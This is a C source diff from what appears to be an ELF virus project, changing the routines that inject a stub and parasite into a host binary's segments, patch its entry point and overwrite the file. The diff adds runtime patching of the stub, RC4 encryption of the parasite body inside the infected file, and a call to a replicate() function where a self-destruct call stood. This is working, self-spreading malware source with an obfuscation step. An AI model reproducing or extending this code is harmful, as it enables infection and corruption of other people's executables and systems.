@@ -26,20 +26,19 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 
 __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
 {
-	uint8_t stub[] =
-	{
-		0x55, 0x54, 0x57, 0x56, 0x52, 0xe8, 0x06, 0x00, 0x00, 0x00,
-		0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x0a, 0xbf, 0x01, 0x00, 0x00,
-		0x00, 0x5e, 0xba, 0x06, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x00,
-		0x00, 0x00, 0x0f, 0x05, 0x5a, 0x5e, 0x5f, 0x5c, 0x5d, 0xe9,
-		0xba, 0xba, 0xfe, 0xca
-	};
+	char *stub = (char *)L1;
 
-	const size_t jump_offset = sizeof(stub) - JUMP_SIZE;
-	const size_t entry_point = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - JUMP_OFFSET);
+	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (STUB_SIZE - (ADDR_OFFSET + 0x4)));
+	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
+	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));
 
-	_memcpy(&stub[jump_offset], &entry_point, sizeof(int));
-	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, sizeof(stub));
+	const size_t size = sizeof(int);
+
+	_memcpy(stub + ADDR_OFFSET, &patch_address, size); 
+	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
+	_memcpy(stub + (STUB_SIZE - 0x4), &patch_jump, size);
+
+	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, STUB_SIZE);
 }
 
 __attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
@@ -78,8 +77,8 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 {
 //	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
-#if DEBUG
-	MID_TRACER("injection:\t\t");
+#if LOGGER
+	MID_LOGGER("injection:\t\t");
 #endif
 
 	if (context == FAILURE)
@@ -96,10 +95,13 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 	}
 
+	unsigned char key[] = "********";
+
 	write_on_memory(ptr, (char *)host->header, host->segment);
 	insert_stub(ptr, host->segment);
 	insert_parasite(ptr, host->segment);
 	patch_entry_point(ptr, host);
+	RC4(key, DEFAULT_KEY_SIZE, ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);
 //	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
 
 	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
@@ -117,5 +119,5 @@ label:
 //	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
 //	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
-	autodestruction(host, keychain, context);
+	replicate(host, keychain, context);
 }
